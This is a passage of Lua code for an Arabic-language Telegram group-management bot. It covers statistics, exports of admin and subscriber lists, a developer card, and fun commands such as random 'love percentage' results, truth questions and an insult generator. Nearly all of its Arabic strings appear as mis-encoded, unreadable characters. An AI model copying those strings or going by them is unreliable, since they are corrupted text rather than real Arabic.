send(msg.chat_id_, msg.id_,'Ω­ Ψ§Ψ­Ψ΅Ψ§Ψ¦ΩΨ§Ψͺ Ψ§ΩΨ¨ΩΨͺ \n\nΩ­ ΨΉΨ―Ψ― Ψ§ΩΩΨ¬ΩΩΨΉΨ§Ψͺ *~ '..Groups..'\nΩ­ ΨΉΨ―Ψ― Ψ§ΩΩΨ΄ΨͺΨ±ΩΩΩ ~ '..Users..'*')
end
if text == 'Ψ¬ΩΨ¨ ΩΨ³Ψ?Ω Ψ§Ψ­ΨͺΩΨ§Ψ·ΩΩ' and DevSonic(msg) then
local list = database:smembers(bot_id..'Chek:Groups')  
local memo = database:smembers(bot_id..'UsersBot')  
local t = '{"BOT_ID": '..bot_id..',"GP_BOT":{'  
for k,v in pairs(list) do   
NAME = 'Tshake Chat'
ASAS = database:smembers(bot_id.."Basic:Creator"..v)
MNSH = database:smembers(bot_id.."Creator"..v)
MDER = database:smembers(bot_id.."Manager"..v)
MOD = database:smembers(bot_id.."Mod:User"..v)
link = database:get(bot_id.."Link_Group"..v) or ''
if k == 1 then
t = t..'"'..v..'":{"Tshake":"'..NAME..'",'
else
t = t..',"'..v..'":{"Tshake":"'..NAME..'",'
end
if #ASAS ~= 0 then 
t = t..'"ASAS":['
for k,v in pairs(ASAS) do
if k == 1 then
t =  t..'"'..v..'"'
else
t =  t..',"'..v..'"'
end
end   
t = t..'],'
end
if #MOD ~= 0 then
t = t..'"MOD":['
for k,v in pairs(MOD) do
if k == 1 then
t =  t..'"'..v..'"'
else
t =  t..',"'..v..'"'
end
end   
t = t..'],'
end
if #MDER ~= 0 then
t = t..'"MDER":['
for k,v in pairs(MDER) do
if k == 1 then
t =  t..'"'..v..'"'
else
t =  t..',"'..v..'"'
end
end   
t = t..'],'
end
if #MNSH ~= 0 then
t = t..'"MNSH":['
for k,v in pairs(MNSH) do
if k == 1 then
t =  t..'"'..v..'"'
else
t =  t..',"'..v..'"'
end
end   
t = t..'],'
end
t = t..'"linkgroup":"'..link..'"}' or ''
end
if #memo ~= 0 then 
t = t..'"mem":['
for k,v in pairs(memo) do
if k == 1 then
t =  t..'"'..v..'"'
else
t =  t..',"'..v..'"'
end
end   
t = t..'],'
end
t = t..'}}'
local File = io.open('./File_Libs/'..bot_id..'.json', "w")
File:write(t)
File:close()
sendDocument(msg.chat_id_, msg.id_,'./File_Libs/'..bot_id..'.json', 'Ω­  ΨΉΨ―Ψ― ΩΨ¬ΩΩΨΉΨ§Ψͺ Ψ§ΩΨͺΩ ΩΩ Ψ§ΩΨ¨ΩΨͺ { '..#list..'} .\nΩ­ ΨΉΨ―Ψ― Ψ§ΩΩΨ΄ΨͺΨ±ΩΩΩ { '..#memo..' } .')
end
if text =='Ψ±ΩΨΉ Ψ§ΩΩΨ΄ΨͺΨ±ΩΩΩ' and DevBot(msg) then
function by_reply(extra, result, success)   
if result.content_.document_ then 
local ID_FILE = result.content_.document_.document_.persistent_id_ 
local File_Name = result.content_.document_.file_name_
local File = json:decode(https.request('https://api.telegram.org/bot'.. token..'/getfile?file_id='..ID_FILE) ) 
download_to_file('https://api.telegram.org/file/bot'..token..'/'..File.result.file_path, ''..File_Name) 
local info_file = io.open('./users.json', "r"):read('*a')
local users = JSON.decode(info_file)
for k,v in pairs(users.users) do
database:sadd(bot_id..'UsersBot',v) 
end
send(msg.chat_id_,msg.id_,'ΨͺΩ Ψ±ΩΨΉ :'..#users.users..' ΩΨ΄ΨͺΨ±Ω ')
end   
end
tdcli_function ({ ID = "GetMessage", chat_id_ = msg.chat_id_, message_id_ = tonumber(msg.reply_to_message_id_) }, by_reply, nil)
end

if text =='Ψ¬ΩΨ¨ Ψ§ΩΩΨ΄ΨͺΨ±ΩΩΩ' and DevBot(msg) then
local list = database:smembers(bot_id..'UsersBot')  
local t = '{"users":['  
for k,v in pairs(list) do
if k == 1 then
t =  t..'"'..v..'"'
else
t =  t..',"'..v..'"'
end
end
t = t..']}'
local File = io.open('./users.json', "w")
File:write(t)
File:close()
sendDocument(msg.chat_id_, msg.id_, './users.json', 'ΨΉΨ―Ψ― Ψ§ΩΩΨ΄ΨͺΨ±ΩΩΩ :'..#list)
end
if text == "Ψ§ΩΩΨ·ΩΨ±" then
local Text_Dev = database:get(bot_id..'Text_Dev')
if Text_Dev then 
send(msg.chat_id_, msg.id_,Text_Dev)
else
tdcli_function ({ID = "GetUser",user_id_ = Id_Sudo,},function(arg,result) 
local function mahmoud(extra, mahmoud, success)
if mahmoud.photos_[0] then
local Name = 'ΩΨ·ΩΨ± Ψ§ΩΨ¨ΩΨͺ\n['..result.first_name_..'](tg://user?id='..result.id_..')\n'
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = ''..result.first_name_..'', url = "https://t.me/"..result.username_..""},
},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id='..msg.chat_id_..'&caption='..URL.escape(Name)..'&photo='..mahmoud.photos_[0].sizes_[1].photo_.persistent_id_..'&reply_to_message_id='..msg_id..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
else
sendText(msg.chat_id_,Name,msg.id_/2097152/0.5,'md')
 end end
tdcli_function ({ ID = "GetUserProfilePhotos", user_id_ = Id_Sudo, offset_ = 0, limit_ = 1 }, mahmoud, nil)
end,nil)
end
end


if text == 'Ψ­Ψ°Ω ΩΩΩΨ΄Ω Ψ§ΩΩΨ·ΩΨ±' and DevSonic(msg) then
database:del(bot_id..'Text_Dev')
send(msg.chat_id_, msg.id_,'Ω­ ΨͺΩ Ψ­Ψ°Ω ΩΩΩΨ΄Ω Ψ§ΩΩΨ·ΩΨ±')
end
if text == 'ΩΨΆΨΉ ΩΩΩΨ΄Ω Ψ§ΩΩΨ·ΩΨ±' and DevSonic(msg) then
database:set(bot_id..'Set:Text_Dev'..msg.chat_id_..':'..msg.sender_user_id_,true)
send(msg.chat_id_,msg.id_,'Ω­ Ψ§Ψ±Ψ³Ω Ψ§ΩΩΩΩΨ΄Ω Ψ§ΩΨ§Ω')
return false
end
if text and database:get(bot_id..'Set:Text_Dev'..msg.chat_id_..':'..msg.sender_user_id_) then
if text == 'Ψ§ΩΨΊΨ§Ψ‘' then 
database:del(bot_id..'Set:Text_Dev'..msg.chat_id_..':'..msg.sender_user_id_)
send(msg.chat_id_,msg.id_,'Ω­ ΨͺΩ Ψ§ΩΨΊΨ§Ψ‘ Ψ­ΩΨΈ ΩΩΩΨ΄Ψ© Ψ§ΩΩΨ·ΩΨ±')
return false
end
database:set(bot_id..'Text_Dev',text)
database:del(bot_id..'Set:Text_Dev'..msg.chat_id_..':'..msg.sender_user_id_)
send(msg.chat_id_,msg.id_,'Ω­ ΨͺΩ Ψ­ΩΨΈ ΩΩΩΨ΄Ψ© Ψ§ΩΩΨ·ΩΨ±')
return false
end

if text == "Ψ§ΩΨ³Ψ§ΨΉΩ" then
local yytesj20 = "\n Ψ§ΩΨ³Ψ§ΨΉΩ Ψ§ΩΨ§Ω : "..os.date("%I:%M%p")
send(msg.chat_id_, msg.id_,yytesj20)
end

if text == "Ψ§ΩΨͺΨ§Ψ±ΩΨ?" then
local cfhoog = "\n Ψ§ΩΨͺΨ§Ψ±ΩΨ? : "..os.date("%Y/%m/%d")
send(msg.chat_id_, msg.id_,cfhoog)
end

if text == "ΨͺΨ­Ψ―ΩΨ«" and DevSonic(msg) then
dofile("Tshake.lua") 
send(msg.chat_id_, msg.id_, "Ω­ ΨͺΩ Ψ§ΩΨͺΨ­Ψ―ΩΨ«")
end
----------
if text == "ΨͺΩΨΉΩΩ Ψ§ΩΨ²Ψ?Ψ±ΩΩ" or text == 'ΨͺΩΨΉΩΩ Ψ²Ψ?Ψ±ΩΩ' then
if Admin(msg) then 
database:del(bot_id.."my_zh:status"..msg.chat_id_) 
send(msg.chat_id_, msg.id_," Ω­ ΨͺΩ ΨͺΩΨΉΩΩ Ψ§ΩΨ²Ψ?Ψ±ΩΩ") 
return false 
end
end
if text == "ΨͺΨΉΨ·ΩΩ Ψ§ΩΨ²Ψ?Ψ±ΩΩ" or text == 'ΨͺΨΉΨ·ΩΩ Ψ²Ψ?Ψ±ΩΩ' then
if Admin(msg) then 
database:set(bot_id.."my_zh:status"..msg.chat_id_,true) 
send(msg.chat_id_, msg.id_," Ω­ ΨͺΩ ΨͺΨΉΨ·ΩΩ Ψ§ΩΨ²Ψ?Ψ±ΩΩ ") 
return false end
end
if text and text:match("^Ψ²Ψ?Ψ±ΩΩ (.*)$") then
local my_zh = database:get(bot_id.."my_zh:status"..msg.chat_id_)
if my_zh then
send(msg.chat_id_, msg.id_," Ω­ Ψ§ΩΨ²Ψ?Ψ±ΩΩ ΩΨΉΨ·ΩΩ") 
return false 
end
local TextZhrfa = text:match("^Ψ²Ψ?Ψ±ΩΩ (.*)$")
zh = https.request('https://boyka-api.ml/frills.php?en='..URL.escape(TextZhrfa)..'')
zx = JSON.decode(zh)
t = "\n Ω­ ΩΨ§Ψ¦ΩΩ Ψ§ΩΨ²Ψ?Ψ±ΩΩ \nΩ΄ Ω­ Ω΄βͺβββββββββββββ«Ω΄ Ω­ βΩ΄ \n"
i = 0
for k,v in pairs(zx.ok) do
i = i + 1
t = t..i.."- `"..v.."` \n"
end
send(msg.chat_id_, msg.id_, t..'Ω΄ Ω­ Ω΄βͺβββββββββββββ«Ω΄ Ω­ βΩ΄\n Ω­ ε½‘ .[SOURCE REVOR](t.me/revorb0t)β’ ')
end
-----by-7oda--
if text == 'Ψ­ΨΈΨ±' or text == 'Ψ§ΩΨΊΨ§Ψ‘ Ψ­ΨΈΨ±' or text == 'ΩΨͺΩ' or text == 'Ψ§ΩΨΊΨ§Ψ‘ ΩΨͺΩ' or text == 'Ψ·Ψ±Ψ―' or text == 'ΨͺΩΩΩΨ―' or text == 'Ψ§ΩΨΊΨ§Ψ‘ ΨͺΩΩΩΨ―' or text == 'ΩΩΩ Ψ§ΩΨ―Ψ±Ψ―Ψ΄Ω' or text == 'ΩΨͺΨ­ Ψ§ΩΨ―Ψ±Ψ―Ψ΄Ω' and msg.reply_to_message_id_ and not Admin(msg) then
send(msg.chat_id_, msg.id_,'ΩΩΨ³ ΩΨ―ΩΩ Ψ±ΨͺΨ¨Ω ΩΨ§Ψ³ΨͺΨ?Ψ―Ψ§Ω ΩΨ°Ω Ψ§ΩΨ§ΩΨ§ΩΨ± π')
return false
end
--------------
if text == 'Ψ§ΩΨ§ ΩΩΩ' or text == 'ΩΩΩ Ψ§ΩΨ§' then
if msg.sender_user_id_ == tonumber(1593178008) then
send(msg.chat_id_, msg.id_,'Ψ§ΩΨͺ Ψ­ΩΨ―Ψ§ ΩΨ·ΩΨ± Ψ§ΩΨ³ΩΨ±Ψ³ ΩΩΩΨ¨Ω πβ₯')
else
if msg.sender_user_id_ == tonumber(sudo_id) then
send(msg.chat_id_, msg.id_,'Ψ§ΩΨͺ Ψ§ΩΩΨ·ΩΨ± Ψ§ΩΨ§Ψ³Ψ§Ψ³Ω ΩΨ±ΩΨ­ ΩΩΨ¨Ωβ₯')
else
if DevBot(msg) then
send(msg.chat_id_, msg.id_,'Ψ§ΩΨͺ ΩΨ·ΩΨ±Ω ΩΩΨ± ΨΉΩΩΨ§π₯Ίπ€')
else
if SupCreator(msg) then
send(msg.chat_id_, msg.id_,'Ψ§ΩΨͺ ΩΩΨ§ ΩΩΨ΄Ψ¦ Ψ§Ψ³Ψ§Ψ³Ω ΩΨΉΩΩ Ψ§ΩΨ±ΩΩ Ψ±ΩΩΩ ΨΉΨ§ΩΨ²Ω ΨͺΨͺΨ΄ΩΩΨ¨πΉπ')
else
if Creator(msg) then 
send(msg.chat_id_, msg.id_,'Ψ§ΩΨͺΩ ΩΩΨ΄Ψ¦ ΩΨ³Ψ·Ψ§ ΨΉΨͺΩΨ§Ψ‘ ΩΩΨ΄Ψ¦ ΨΉΨ§ΩΨ² Ψ­Ψ§Ψ¬Ω ΨͺΨ§ΩΩΩπΉ??ββοΈ')
else
if Manger(msg) then
send(msg.chat_id_, msg.id_,'Ψ§ΩΨͺ ΩΨ―ΩΨ± ΩΨΉΩΩ Ψ§ΩΨ«Ψ± Ψ΄Ψ±Ψ§Ψ³Ω Ψ¨Ψ³ ΩΩΩΨ΄ Ψ?ΩΩ ΩΩΩ Ψ¨Ψ±ΨΆΩπΉπΉ')
else 
if Admin(msg) then 
send(msg.chat_id_, msg.id_,'Ψ§ΩΨͺ Ψ§Ψ―ΩΩ ΩΨ΄ Ψ΄Ψ±Ψ³ Ψ§ΩΩ ΩΨΉΩΩπΉπΉ')
else
if Special(msg) then 
send(msg.chat_id_, msg.id_,'ΩΩΩΨ² ΩΨΉΩΩΨ§ ΩΩΩΩΩΩΩΩπΉπΉ')
else 
send(msg.chat_id_, msg.id_,'ΨΉΨΆΩ Ψ­ΩΩΨ± Ψ²ΩΩΩ Ψ΄ΩΩΩπΉπ')
end
end
end
end
end
end
end
end
end
---------by-7oda
if text == "ΨͺΩΨΉΩΩ ΩΩΩ" then
if Admin(msg) then 
database:set(bot_id.."my_go:status"..msg.chat_id_,true) 
send(msg.chat_id_, msg.id_," Ω­ ΨͺΩ ΨͺΩΨΉΩΩ ΩΩΩ") 
return false 
end
end
if text == "ΨͺΨΉΨ·ΩΩ ΩΩΩ" then
if Admin(msg) then 
database:del(bot_id.."my_go:status"..msg.chat_id_) 
send(msg.chat_id_, msg.id_," Ω­ ΨͺΩ ΨͺΨΉΨ·ΩΩ ΩΩΩ") 
return false end
end
if text and text:match("^ΩΩΩ (.*)$") then
local my_gm = database:get(bot_id.."my_go:status"..msg.chat_id_)
if not my_gm then
send(msg.chat_id_, msg.id_," Ω­ Ψ§Ψ§ΩΨ± ΩΩΩ ΩΨΉΨ·Ω") 
return false 
end
local Textxt = text:match("^ΩΩΩ (.*)$")
send(msg.chat_id_, msg.id_, '['..Textxt..']')
end
if text and text:match("^Ψ§Ψ΄ΨͺΩ (.*)$") then
local T = text:match("^Ψ§Ψ΄ΨͺΩ (.*)$")
if T == 'ΩΨ­ΩΩΨ―' or T == 'Ψ­ΩΨ―Ψ§' or T == '@MahmoudM2' or T == 'mahmoud' or T == 'Mahmoud' then
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
local UserName = (data.username_ or "revorb0t")
mm = "ΩΨͺΩΩΩ Ψ§ΩΨͺ ΩΨ§ ["..data.first_name_.."](T.me/"..UserName..")\nΨ§ΩΨͺ ΨΉΨ§ΩΨ²ΩΩ Ψ§Ψ΄ΨͺΩ ΩΨ·ΩΨ± Ψ§ΩΨ³ΩΨ±Ψ³ ΨππΉ\n"
send(msg.chat_id_, msg.id_,mm)
end,nil)
else
local N = {
'ΩΨͺΩΩΩ ΩΨ§ '..T..' πΉπ',
'ΩΨ­Ψ±ΩΩ Ω '..T..' π',
'Ψ§Ψ¨Ω Ψ΄ΩΩΩ ΩΨ§ '..T..'',
}
mmm = math.random(#N)
send(msg.chat_id_, msg.id_, N[mmm])
end
end
-----------
if text == "ΩΨ³Ψ¨Ω Ψ§ΩΨ­Ψ¨" or text == "ΩΨ³Ψ¨Ω Ψ­Ψ¨" and msg.reply_to_message_id_ ~= 0 and Admin(msg) then
database:set(bot_id..":"..msg.sender_user_id_..":lov_Bots"..msg.chat_id_,"sendlove")
Text = 'Ψ§Ψ±Ψ³Ω Ψ§Ψ³ΩΩ ΩΨ§Ψ³Ω Ψ§ΩΨ΄Ψ?Ψ΅ Ψ§ΩΨ«Ψ§ΩΩΨ \n ΩΨ«Ψ§Ω Ψ§Ψ³Ψ― Ω ΩΨ¨ΩΩ'
send(msg.chat_id_, msg.id_,Text) 
end
if text and text ~="ΩΨ³Ψ¨Ω Ψ§ΩΨ­Ψ¨" and database:get(bot_id..":"..msg.sender_user_id_..":lov_Bots"..msg.chat_id_) == "sendlove" then
num = {"10","20","30","35","75","34","66","82","23","19","55","8","63","32","27","89","99","98","3","80","49","100","6","0",};
sendnum = num[math.random(#num)]
sl = 'ΩΨ³Ψ¨Ω Ψ­Ψ¨ '..text..' ΩΩ : '..sendnum..'%'
send(msg.chat_id_, msg.id_,sl) 
database:del(bot_id..":"..msg.sender_user_id_..":lov_Bots"..msg.chat_id_)
end
if text == "ΩΨ³Ψ¨Ω Ψ§ΩΩΨ±Ω" or text == "ΩΨ³Ψ¨Ω ΩΨ±Ω" and msg.reply_to_message_id_ ~= 0 and Admin(msg) then
database:set(bot_id..":"..msg.sender_user_id_..":krh_Bots"..msg.chat_id_,"sendkrhe")
Text = 'Ψ§Ψ±Ψ³Ω Ψ§Ψ³ΩΩ ΩΨ§Ψ³Ω Ψ§ΩΨ΄Ψ?Ψ΅ Ψ§ΩΨ«Ψ§ΩΩΨ \n ΩΨ«Ψ§Ω Ψ§Ψ³Ψ― Ω ΩΨ¨ΩΩ'
send(msg.chat_id_, msg.id_,Text) 
end
if text and text ~="ΩΨ³Ψ¨Ω Ψ§ΩΩΨ±Ω" and database:get(bot_id..":"..msg.sender_user_id_..":krh_Bots"..msg.chat_id_) == "sendkrhe" then
num = {"10","20","30","35","75","34","66","82","23","19","55","8","63","32","27","89","99","98","3","80","8","100","6","0",};
sendnum = num[math.random(#num)]
sl = 'ΩΨ³Ψ¨Ω ΩΨ±Ω '..text..' ΩΩ : '..sendnum..'%'
send(msg.chat_id_, msg.id_,sl) 
database:del(bot_id..":"..msg.sender_user_id_..":krh_Bots"..msg.chat_id_)
end
if text == "ΩΨ³Ψ¨Ω Ψ±Ψ¬ΩΩΩ" or text == "ΩΨ³Ψ¨Ω Ψ§ΩΨ±Ψ¬ΩΩΩ" and msg.reply_to_message_id_ ~= 0 and Admin(msg) then
database:set(bot_id..":"..msg.sender_user_id_..":rjo_Bots"..msg.chat_id_,"sendrjoe")
Text = 'Ψ§Ψ±Ψ³Ω Ψ§Ψ³Ω Ψ§ΩΨ΄Ψ?Ψ΅ Ψ§ΩΨ°Ω ΨͺΨ±ΩΨ― ΩΩΨ§Ψ³ ΩΨ³Ψ¨Ω Ψ±Ψ¬ΩΩΨͺΩ \n ΩΨ«Ψ§Ω Ψ§ΩΩΨ±'
send(msg.chat_id_, msg.id_,Text) 
end
if text and text ~="ΩΨ³Ψ¨Ω Ψ±Ψ¬ΩΩΩ" and database:get(bot_id..":"..msg.sender_user_id_..":rjo_Bots"..msg.chat_id_) == "sendrjoe" then
numj = {"10","20","30","35","75","34","66","82","23","19","55","80","63","32","27","89","99","98","79","100","8","3","6","0",};
sendnuj = numj[math.random(#numj)]
xl = 'ΩΨ³Ψ¨Ω Ψ±Ψ¬ΩΩΩ '..text..' ΩΩ : \n '..sendnuj..'%'
send(msg.chat_id_, msg.id_,xl) 
database:del(bot_id..":"..msg.sender_user_id_..":rjo_Bots"..msg.chat_id_)
end
if text == "Ψ΅Ψ±Ψ§Ψ­Ω" or text == "Ψ§ΩΨ΅Ψ±Ψ§Ψ­Ω" and msg.reply_to_message_id_ ~= 0 and Admin(msg) then
database:set(bot_id..":"..msg.sender_user_id_..":rkko_Bots"..msg.chat_id_,"sendrkkoe")
local LEADER_Msg = {
"Ψ΅Ψ±Ψ§Ψ­Ω | Ψ΅ΩΨͺΩ Ψ­ΩΩΨ©Ψ",
"Ψ΅Ψ±Ψ§Ψ­Ω | Ψ§ΩΨͺΩΩΨͺ Ψ§ΩΩΨ§Ψ³ ΩΨΉ ΩΨ¬ΩΩΩΩΨ",
"Ψ΅Ψ±Ψ§Ψ­Ω | Ψ΄ΩΨ‘ ΩΩΩΨͺ ΨͺΨ­ΩΩ Ψ§ΩΩΨ³Ψ§ΩΨ",
"Ψ΅Ψ±Ψ§Ψ­Ω | Ψ£ΩΨ§ Ψ΄Ψ?Ψ΅ ΨΆΨΉΩΩ ΨΉΩΨ―ΩΨ§Ψ",
"Ψ΅Ψ±Ψ§Ψ­Ω | ΩΩ ΨͺΨ±ΨΊΨ¨ ΩΩ Ψ₯ΨΈΩΨ§Ψ± Ψ­Ψ¨Ω ΩΩΨ±ΩΩ ΩΨ΄Ψ?Ψ΅ Ψ£Ω Ψ±Ψ€ΩΨ© ΩΨ°Ψ§ Ψ§ΩΨΆΨΉΩΨ",
"Ψ΅Ψ±Ψ§Ψ­Ω | ΩΨ―Ω ΨΉΩΩ Ψ£Ω Ψ§ΩΩΨ°Ψ¨ ΩΨ±Ψ§Ψͺ ΨͺΩΩΩ ΨΆΨ±ΩΨ±ΩΨ© Ψ΄ΩΨ",
"Ψ΅Ψ±Ψ§Ψ­Ω | Ψ£Ψ΄ΨΉΨ± Ψ¨Ψ§ΩΩΨ­Ψ―Ψ© ΨΉΩΩ Ψ§ΩΨ±ΨΊΩ ΩΩ Ψ£ΩΩΩ ΨͺΨ­ΩΨ· Ψ¨Ω ΩΨ«ΩΨ±Ψ§Ψ",
"Ψ΅Ψ±Ψ§Ψ­Ω | ΩΩΩΩΨ© Ψ§ΩΩΨ΄Ω ΨΉΩ ΩΩ ΩΩΩΩ ΨΉΩΩΩΨ",
"Ψ΅Ψ±Ψ§Ψ­Ω | Ψ₯Ψ°Ψ§ Ψ­Ψ§ΩΩ Ψ΄Ψ?Ψ΅ ΩΨ§ Ψ£Ω ΩΩΨ±ΩΩ Ψ£Ω ΩΩΨͺΨ±Ψ¨ ΩΩΩ ΩΩΩΨͺΩ Ψ¨Ω ΨͺΨΉΨ·ΩΩ ΩΨ±Ψ΅Ψ©Ψ",
"Ψ΅Ψ±Ψ§Ψ­Ω | Ψ£Ψ΄Ψ¬ΨΉ Ψ΄ΩΨ‘ Ψ­ΩΩ ΩΩ Ψ­ΩΨ§ΨͺΩΨ",
"Ψ΅Ψ±Ψ§Ψ­Ω | Ψ·Ψ±ΩΩΨ© Ψ¬ΩΨ―Ψ© ΩΩΩΨΉ Ψ­ΨͺΩ ΩΩ ΩΨ§ΩΨͺ Ψ§ΩΩΩΨ±Ψ© Ψ?Ψ§Ψ·Ψ¦Ψ© ΨͺΩΨ§ΩΩΨ",
"Ψ΅Ψ±Ψ§Ψ­Ω | ΩΩΩ ΨͺΨͺΨ΅Ψ±Ω ΩΨΉ ΩΩ ΩΨ³ΩΨ¦ΩΩ ΩΩΩΩ ΩΩΨ£Ψ?Ψ° ΨΉΩΩ Ψ°ΩΩΩ Ψ«Ω ΩΩΨͺΨΈΨ± Ψ£Ω ΩΨ±ΩΨΆΨ",
"Ψ΅Ψ±Ψ§Ψ­Ω | Ψ§ΩΨͺΨΊΩΩΨ± Ψ§ΩΨΉΨ§Ψ―Ω ΨΉΩΨ―ΩΨ§ ΩΩΩΩ Ψ§ΩΨ΄Ψ?Ψ΅ Ψ§ΩΨ°Ω ΩΨ­Ψ¨ΩΨ",
"Ψ΅Ψ±Ψ§Ψ­Ω | Ψ§ΩΩΩΨ§ΩΩ Ψ§ΩΨ΅ΨΉΨ¨Ψ© ΨͺΨΆΨΉΩ ΩΩ ΩΩΨ§ ΨͺΨ±ΩΨΉΨ",
"Ψ΅Ψ±Ψ§Ψ­Ω | ΩΨΈΨ±Ψ© Ω ΩΩΨ³Ψ― Ψ§ΩΨ΅Ψ―Ψ§ΩΨ©Ψ",
"Ψ΅Ψ±Ψ§Ψ­Ω | ββΨ₯Ψ°Ψ§ Ψ£Ψ­Ψ― ΩΨ§ΩΩ ΩΩΨ§Ω Ψ³ΩΨ‘ Ψ¨Ψ§ΩΨΊΨ§ΩΨ¨ ΩΨ΄ ΨͺΩΩΩ Ψ±Ψ―Ψ© ΩΨΉΩΩΨ",
"Ψ΅Ψ±Ψ§Ψ­Ω | Ψ΄Ψ?Ψ΅ ΩΨΉΩ Ψ¨Ψ§ΩΨ­ΩΩΩ ΩΨ§ΩΩΩΨ±ΩΨ",
"Ψ΅Ψ±Ψ§Ψ­Ω | βΩΩ ΨͺΨ­Ψ¨ Ψ₯ΨΈΩΨ§Ψ± Ψ­Ψ¨Ω ΩΨͺΨΉΩΩΩ Ψ¨Ψ§ΩΨ΄Ψ?Ψ΅ Ψ£Ω ΨͺΨ±Ω Ψ°ΩΩ ΨΆΨΉΩΨ",
"Ψ΅Ψ±Ψ§Ψ­Ω | ΨͺΨ£Ψ?Ψ° Ψ¨ΩΩΨ§Ω Ψ§ΩΩΩ ΩΩΨ΅Ψ­Ω ΩΩΨ§ ΨͺΨ³ΩΩ Ψ§ΩΩΩ ΨͺΨ¨ΩΨ",
"Ψ΅Ψ±Ψ§Ψ­Ω | ΩΨ΄ ΨͺΨͺΩΩΩ Ψ§ΩΩΨ§Ψ³ ΨͺΨΉΨ±Ω ΨΉΩΩΩΨ",
"Ψ΅Ψ±Ψ§Ψ­Ω | Ψ§Ψ¨ΩΨΉ Ψ§ΩΩΨ¬Ψ±Ψ© ΨΉΨ΄Ψ§ΩΨ",
"Ψ΅Ψ±Ψ§Ψ­Ω | Ψ£Ψ­ΩΨ§ΩΨ§ Ψ§Ψ­Ψ³ Ψ§Ω Ψ§ΩΩΨ§Ψ³ Ψ ΩΩΩΨ",
"Ψ΅Ψ±Ψ§Ψ­Ω | ΩΨΉ ΩΩΩ ΩΨ―Ω ΨͺΩΨ§Ω Ψ§ΩΩΩΩΨ",
"Ψ΅Ψ±Ψ§Ψ­Ω | Ψ΅Ψ―ΩΨ© Ψ§ΩΨΉΩΨ± Ψ§ΩΨ­ΩΩΨ© ΩΩ Ψ§ΩΩΨ",
"Ψ΅Ψ±Ψ§Ψ­Ω | Ψ§ΩΩΩΨ±Ω Ψ§ΩΨΉΨΈΩΩ Ψ―Ψ§ΩΩ ΩΨ¬Ω Ψ¨ΨΉΨ― Ψ­ΩΨ¨ ΩΩΩ ΨͺΨͺΩΩΨ",
"Ψ΅Ψ±Ψ§Ψ­Ω | Ψ΅ΩΨ© ΨͺΨ­Ψ¨ΩΨ§ ΩΩ ΩΩΨ³ΩΨ",
"Ψ΅Ψ±Ψ§Ψ­Ω | βΨ§ΩΩΩΨ± ΩΩΨ± Ψ§ΩΨΉΩΩΩ ΩΩΨ³ Ψ§ΩΨ¬ΩΩΨ¨ Ψ ΨͺΨͺΩΩΨ",
"Ψ΅Ψ±Ψ§Ψ­Ω | ΨͺΨ΅ΩΩ Ψ΅ΩΩΨ§ΨͺΩ Ψ§ΩΨ?ΩΨ³ ΩΩΩΨ§Ψ",
"Ψ΅Ψ±Ψ§Ψ­Ω | βΨͺΨ¬Ψ§ΩΩ Ψ£Ψ­Ψ― ΨΉΩΩ Ψ±Ψ§Ψ­ΨͺΩΨ",
"Ψ΅Ψ±Ψ§Ψ­Ω | Ψ§Ψ΄Ψ¬ΨΉ Ψ΄ΩΨ‘ Ψ³ΩΩΨͺΨ© Ψ¨Ψ­ΩΨ§ΨͺΩΨ",
"Ψ΅Ψ±Ψ§Ψ­Ω | ΩΨ΄ ΩΨ§ΩΩ ΨͺΨ³ΩΩ Ψ§ΩΩΩΩΨ",
"Ψ΅Ψ±Ψ§Ψ­Ω | ΩΨ΄ Ψ΄ΨΉΩΨ±Ω ΩΩΨ§ ΨͺΨ΄ΩΩ Ψ§ΩΩΨ·Ψ±Ψ",
"Ψ΅Ψ±Ψ§Ψ­Ω | ΨΊΩΨ±ΨͺΩ ΩΨ§Ψ―ΩΩ ΩΩΨ§ ΨͺΨ³ΩΩ ΩΨ΄Ψ§ΩΩΨ",
"Ψ΅Ψ±Ψ§Ψ­Ω | ΩΨ§ Ψ§ΩΨ«Ψ± Ψ΄Ω ΩΨ―ΩΩ ΨΉΩΩΩΨ",
"Ψ΅Ψ±Ψ§Ψ­Ω | Ψ§Ω Ψ§ΩΨ―ΩΩ ΨͺΨͺΩΩΩ Ψ§Ω ΨͺΨ²ΩΨ±ΩΨ§Ψ",
"Ψ΅Ψ±Ψ§Ψ­Ω | ΩΨͺΩ Ψ§Ψ?Ψ± ΩΨ±Ω Ψ¨ΩΩΨͺΨ",
"Ψ΅Ψ±Ψ§Ψ­Ω | ΨͺΩΩΩ Ψ­ΨΈΩ Ψ ΩΩ ΨΉΨ΄Ψ±ΩΨ",
"Ψ΅Ψ±Ψ§Ψ­Ω | ΩΩ ΨͺΨΉΨͺΩΨ― Ψ§Ω Ψ­ΨΈΩ Ψ³ΩΨ¦Ψ",
"Ψ΅Ψ±Ψ§Ψ­Ω | Ψ΄ΩΨ?ΩΩΨ΅ ΨͺΨͺΩΩΩΩΩ Ψ§ΩΨ₯ΩΨͺΩΩΩΨ§Ω ΩΩΩΩΩΩΨ",
"Ψ΅Ψ±Ψ§Ψ­Ω | ΩΩΩΨ© ΨͺΩΨ― Ψ³ΩΨ§ΨΉΩΨ§ ΩΩ ΩΩΩΨ",
"Ψ΅Ψ±Ψ§Ψ­Ω | **ΩΩ ΨͺΩΨͺΩΩ ΨΉΩΩΩ Ψ£Ω ΨͺΨ΄ΨΉΨ± Ψ¨Ψ§ΩΩΩΩΨ",
"Ψ΅Ψ±Ψ§Ψ­Ω | ΩΩ ΩΩΨͺ Ψ¨Ψ§ΩΨͺΨ­Ψ§Ω Ψ£Ψ­Ψ― Ψ§ΩΨ΄Ψ?Ψ΅ΩΨ§Ψͺ ΩΨͺΩΨ°Ψ¨ ΨΉΩΩ ΩΩ Ψ­ΩΩΩΨ",
"Ψ΅Ψ±Ψ§Ψ­Ω | ΩΨͺΩ Ψ’Ψ?Ψ± ΩΨ±Ψ© ΩΩΨͺ Ψ¨ΨΉΩΩ ΩΩΨ΄ΩΩΨ© ΩΨ¨ΩΨ±Ψ© ΩΨͺΨ³Ψ¨Ψ¨Ψͺ ΩΩ Ψ?Ψ³Ψ§Ψ¦Ψ±Ψ",
